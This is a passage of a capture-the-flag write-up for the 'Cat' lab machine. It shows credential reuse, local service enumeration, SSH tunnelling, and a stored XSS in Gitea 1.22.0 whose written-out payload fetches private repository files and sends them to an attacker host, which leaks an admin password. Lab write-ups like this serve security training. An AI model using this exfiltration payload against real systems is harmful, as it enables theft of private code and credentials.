127.0.0.1 - - [05/Feb/2025:01:28:01 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
```



```bash
rosa@cat:/var/log/apache2$ su axel
Password: 
axel@cat:/var/log/apache2$ cd /home/axel
axel@cat:~$ cat user.txt 
c34f48e1200***********************
```

## Privilege Escalation



```bash
axel@cat:~$ id
uid=1000(axel) gid=1000(axel) groups=1000(axel)
axel@cat:~$ sudo -l
[sudo] password for axel: 
Sorry, user axel may not run sudo on cat.
```



```bash
axel@cat:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
axel:x:1000:1000:axel:/home/axel:/bin/bash
rosa:x:1001:1001:,,,:/home/rosa:/bin/bash
git:x:114:119:Git Version Control,,,:/home/git:/bin/bash
jobert:x:1002:1002:,,,:/home/jobert:/bin/bash
```



### Checking internal ports



```bash
axel@cat:~$ netstat -ano | grep LISTEN
tcp        0      0 127.0.0.1:40681         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:32913         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:32857         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
```



```bash
axel@cat:~$ telnet localhost 25
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
220 cat.htb ESMTP Sendmail 8.15.2/8.15.2/Debian-18; Wed, 5 Feb 2025 02:16:10 GMT; (No UCE/UBE) logging access from: localhost(OK)-localhost [127.0.0.1]
HELO Localhost
250 cat.htb Hello localhost [127.0.0.1], pleased to meet you
MAIL FROM:axel@localhost
250 2.1.0 axel@localhost... Sender ok
RCPT TO:axel@localhost
250 2.1.5 axel@localhost... Recipient ok
DATA
354 Enter mail, end with "." on a line by itself
Hello!.
.
250 2.0.0 5152GAe5002625 Message accepted for delivery
quit
221 2.0.0 cat.htb closing connection
Connection closed by foreign host.
```



```bash
axel@cat:~$ curl 127.0.0.1:3000
<!DOCTYPE html>
<html lang="en-US" data-theme="gitea-auto">
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Cat</title>
	<link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiQ2F0Iiwic2hvcnRfbmFtZSI6IkNhdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9jYXQuaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9jYXQuaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9jYXQuaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnN2ZyIsInR5cGUiOiJpbWFnZS9zdmcreG1sIiwic2l6ZXMiOiI1MTJ4NTEyIn1dfQ==">
	<meta name="author" content="Gitea - Git with a cup of tea">
	<meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go">
	<meta name="keywords" content="go,git,self-hosted,gitea">
	<meta name="referrer" content="no-referrer">
```



### Email found with valuable information



```bash
axel@cat:/var/mail$ ls -l
total 40
-rw-rw---- 1 axel   mail  1961 Jan 14 16:49 axel
-rw-rw---- 1 jobert mail     0 Jan 14 16:54 jobert
-rw------- 1 root   mail 30797 Feb  5 02:15 root

axel@cat:/var/mail$ cat axel 
From rosa@cat.htb  Sat Sep 28 04:51:50 2024
Return-Path: <rosa@cat.htb>
Received: from cat.htb (localhost [127.0.0.1])
	by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S4pnXk001592
	for <axel@cat.htb>; Sat, 28 Sep 2024 04:51:50 GMT
Received: (from rosa@localhost)
	by cat.htb (8.15.2/8.15.2/Submit) id 48S4pnlT001591
	for axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT
Date: Sat, 28 Sep 2024 04:51:49 GMT
From: rosa@cat.htb
Message-Id: <202409280451.48S4pnlT001591@cat.htb>
Subject: New cat services

Hi Axel,

We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service that we can develop.

Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.

From rosa@cat.htb  Sat Sep 28 05:05:28 2024
Return-Path: <rosa@cat.htb>
Received: from cat.htb (localhost [127.0.0.1])
	by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S55SRY002268
	for <axel@cat.htb>; Sat, 28 Sep 2024 05:05:28 GMT
Received: (from rosa@localhost)
	by cat.htb (8.15.2/8.15.2/Submit) id 48S55Sm0002267
	for axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT
Date: Sat, 28 Sep 2024 05:05:28 GMT
From: rosa@cat.htb
Message-Id: <202409280505.48S55Sm0002267@cat.htb>
Subject: Employee management

We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.
```



### SSH Port Forwarding



```bash
❯ ssh -L 25:127.0.0.1:25 -L 3000:127.0.0.1:3000 axel@cat.htb
axel@cat.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)


You have mail.
Last login: Fri Jan 31 11:31:57 2025 from 10.10.14.69
axel@cat:~$
```



```bash
❯ nmap -p- localhost
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-05 03:19 CET
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0000030s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
25/tcp   open  smtp
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 0.77 seconds
```



### Accesing on Gitea with axel credentials



<figure><img src="../../.gitbook/assets/imagen (295).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/4468_vmware_VlFG15Xl52.png" alt=""><figcaption></figcaption></figure>





### Gitea Exploitation - Cross-Site Scripting \[XSS] (CVE-2024-6886)



<figure><img src="../../.gitbook/assets/imagen (296).png" alt=""><figcaption></figcaption></figure>





```bash
❯ searchsploit Gitea 1.22.0
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                      |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Gitea 1.22.0 - Stored XSS                                                                                                                                                                           | multiple/webapps/52077.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```



{% embed url="https://www.incibe.es/index.php/en/incibe-cert/early-warning/vulnerabilities/cve-2024-6886" %}

{% hint style="danger" %}
Vulnerabilidad de neutralización incorrecta de la entrada durante la generación de páginas web (XSS o 'Cross-site Scripting') en Gitea Gitea Open Source Git Server permite XSS almacenado. Este problema afecta a Gitea Open Source Git Server: 1.22.0.
{% endhint %}



### Cookie Hijacking not available



<figure><img src="../../.gitbook/assets/imagen (297).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (298).png" alt=""><figcaption></figcaption></figure>



### Data Exfiltration using XSS



```javascript
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md').then(response => response.text()).then(data => fetch('http://10.10.16.5/?response=' + encodeURIComponent(data))).catch(error => console.error('Error:', error));">gzzcoo</a>
```



<figure><img src="../../.gitbook/assets/imagen (299).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (300).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (301).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/imagen (302).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/imagen (304).png" alt=""><figcaption></figcaption></figure>

```
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```bash
axel@cat:~$ echo -e "Subject: Repo \n\nHi check my repo http://localhost:3000/axel/gzzcoo" | sendmail jobert@localhost
```



```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.53 - - [05/Feb/2025 03:31:32] "GET /?response=%23%20Employee%20Management%0ASite%20under%20construction.%20Authorized%20user%3A%20admin.%20No%20visibility%20or%20updates%20visible%20to%20employees. HTTP/1.1" 200 -
```



<figure><img src="../../.gitbook/assets/imagen (305).png" alt=""><figcaption></figcaption></figure>



```javascript
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://10.10.16.5/?response=' + encodeURIComponent(data))).catch(error => console.error('Error:', error));">gzzcoo</a>
```

<figure><img src="../../.gitbook/assets/imagen (306).png" alt=""><figcaption></figcaption></figure>

```bash
axel@cat:~$ echo -e "Subject: Repo \n\nHi check my repo http://localhost:3000/axel/gzzcoo" | sendmail jobert@localhost
```



```
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.53 - - [05/Feb/2025 03:47:07] "GET /?response=%3C%3Fphp%0A%24valid_username%20%3D%20%27admin%27%3B%0A%24valid_password%20%3D%20%27IKw75eR0MR7CMIxhH0%27%3B%0A%0Aif%20(!isset(%24_SERVER%5B%27PHP_AUTH_USER%27%5D)%20%7C%7C%20!isset(%24_SERVER%5B%27PHP_AUTH_PW%27%5D)%20%7C%7C%20%0A%20%20%20%20%24_SERVER%5B%27PHP_AUTH_USER%27%5D%20!%3D%20%24valid_username%20%7C%7C%20%24_SERVER%5B%27PHP_AUTH_PW%27%5D%20!%3D%20%24valid_password)%20%7B%0A%20%20%20%20%0A%20%20%20%20header(%27WWW-Authenticate%3A%20Basic%20realm%3D%22Employee%20Management%22%27)%3B%0A%20%20%20%20header(%27HTTP%2F1.0%20401%20Unauthorized%27)%3B%0A%20%20%20%20exit%3B%0A%7D%0A%0Aheader(%27Location%3A%20dashboard.php%27)%3B%0Aexit%3B%0A%3F%3E%0A%0A HTTP/1.1" 200 -
```



<figure><img src="../../.gitbook/assets/imagen (307).png" alt=""><figcaption></figcaption></figure>

```bash
axel@cat:~$ su root
Password: 
root@cat:/home/axel$ cd /root
root@cat:~$ cat root.txt 
7127705b521d*********************
```
